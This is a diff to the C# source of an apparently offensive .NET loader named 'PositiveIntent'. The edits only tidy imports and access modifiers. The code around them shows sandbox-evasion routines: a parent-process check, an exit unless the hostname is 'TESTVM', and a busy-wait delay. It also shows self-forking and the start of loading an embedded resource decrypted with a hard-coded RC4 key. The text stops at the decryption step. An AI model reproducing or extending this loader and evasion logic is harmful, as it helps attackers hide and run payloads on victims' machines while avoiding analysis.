@@ -1,21 +1,13 @@
 ﻿using System;
 using System.Diagnostics;
 using System.Reflection;
-using System.Runtime.InteropServices;
-using System.Runtime.CompilerServices;
-using System.Threading;
 using System.Management;
-using System.Linq;
-using System.IO;
-using System.Globalization;
-using System.Net.Sockets;
-using System.Net;
 
 namespace PositiveIntent
 {
     public class Program
     {
-        static bool GetParentProcess()
+        private static bool GetParentProcess()
         {
             int parentPid = 0;
             int ourPid = Process.GetCurrentProcess().Id;
@@ -33,14 +25,14 @@ namespace PositiveIntent
                 return false;
             }
         }
-        static void CheckHostname()
+        private static void CheckHostname()
         {
             if (System.Environment.MachineName != "TESTVM")
             {
                 Environment.Exit(-1);
             }
         }
-        static void DelayExecution(long milliseconds)
+        private static void DelayExecution(long milliseconds)
         {
             var stopwatch = Stopwatch.StartNew();
             while (stopwatch.ElapsedMilliseconds < milliseconds)
@@ -48,7 +40,7 @@ namespace PositiveIntent
                 // keep looping until the elapsed time reaches the desired delay
             }
         }
-        static void Fork(string args)
+        private static void Fork(string args)
         {
             Process p = new Process();
             p.StartInfo.FileName = Process.GetCurrentProcess().ProcessName;
@@ -62,9 +54,9 @@ namespace PositiveIntent
             Console.WriteLine(p.StandardError.ReadToEnd());
             p.WaitForExit();
         }
-        static void LoadAssembly(string[] args)
+        private static void LoadAssembly(string[] args)
         {
-            byte[] eassembly = Properties.Resources.File1;
+            byte[] eassembly = PositiveIntent.Properties.Resources.File1;
             byte[] key = System.Text.Encoding.UTF8.GetBytes("DepthSecurity");
 
             RC4 rc4 = new RC4(key);
